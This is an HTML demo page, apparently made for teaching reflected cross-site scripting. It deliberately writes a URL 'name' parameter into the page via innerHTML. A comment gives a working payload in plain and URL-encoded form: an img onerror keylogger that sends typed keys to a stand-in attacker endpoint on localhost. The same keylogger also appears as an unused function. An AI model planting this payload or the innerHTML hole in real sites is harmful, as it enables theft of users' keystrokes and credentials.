<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>XSS Example</title>
  </head>

  <body>
    <!-- Vulnerable Code -->
    <div>Welcome, <span id="username"></span>!</div>

    <script>
      // Function to set a cookie, mostly this will be set from server
      function setCookie(name, value, days) {
        const date = new Date();
        date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
        const expires = "expires=" + date.toUTCString();
        document.cookie = name + "=" + value + ";" + expires + ";path=/";
      }

      // Example: Set a cookie named "exampleCookie" with value "Hello, Cookie!" that expires in 7 days
      setCookie("exampleCookie", "Hello, Cookie!", 7);
    </script>

    <!-- Vulnerable Code -->
    <script>
      const params = new URLSearchParams(window.location.search);
      const name = params.get("name");

      /*
    CAPTURING KEYSTROKES:
    This is vulnerable code as we can inject malicious script because of innerHTML
    Lets see how the attackers can capture keystrokes.
    Copy and Paste the below code in the URL for name parameter...
    encodeURIComponent('<img src="on_error.gif" onerror='var timeout; var buffer = ""; document .querySelector("body") .addEventListener("keypress", function (event) { if (event.which !== 0) { clearTimeout(timeout); buffer += String.fromCharCode(event.which); timeout = setTimeout(function () { var xhr = new XMLHttpRequest(); var uri = "http://localhost:3001/keys?data=" + encodeURIComponent(buffer); xhr.open("GET", uri); xhr.send(); buffer = ""; }, 400); } });'/>')
    ENCODED DATA:
    ?name=<img%20src%3D"on_error.gif"%20onerror%3D%27var%20timeout%3B%20var%20buffer%20%3D%20""%3B%20document%20.querySelector("body")%20.addEventListener("keypress"%2C%20function%20(event)%20%7B%20if%20(event.which%20!%3D%3D%200)%20%7B%20clearTimeout(timeout)%3B%20buffer%20%2B%3D%20String.fromCharCode(event.which)%3B%20timeout%20%3D%20setTimeout(function%20()%20%7B%20var%20xhr%20%3D%20new%20XMLHttpRequest()%3B%20var%20uri%20%3D%20"http%3A%2F%2Flocalhost%3A3001%2Fkeys%3Fdata%3D"%20%2B%20encodeURIComponent(buffer)%3B%20xhr.open("GET"%2C%20uri)%3B%20xhr.send()%3B%20buffer%20%3D%20""%3B%20%7D%2C%20400)%3B%20%7D%20%7D)%3B%27%2F>
    As soon as you hit enter, and try to type anything on the app, your key strokes will be sent to the attacker.
    Now if you go to network tab, and start typing something using your keyboard, you will be able to see the keystrokes being passed to attacker's endpoint.
    */
      document.getElementById("username").innerHTML = name;

      const attackerFunction = () => {
        var timeout;
        var buffer = "";
        document
          .querySelector("body")
          .addEventListener("keypress", function (event) {
            if (event.which !== 0) {
              clearTimeout(timeout);
              buffer += String.fromCharCode(event.which);
              timeout = setTimeout(function () {
                var xhr = new XMLHttpRequest();
                var uri =
                  "http://localhost:3001/keys?data=" +
                  encodeURIComponent(buffer);
                xhr.open("GET", uri);
                xhr.send();
                buffer = "";
              }, 400);
            }
          });
      };
    </script>
  </body>
</html>
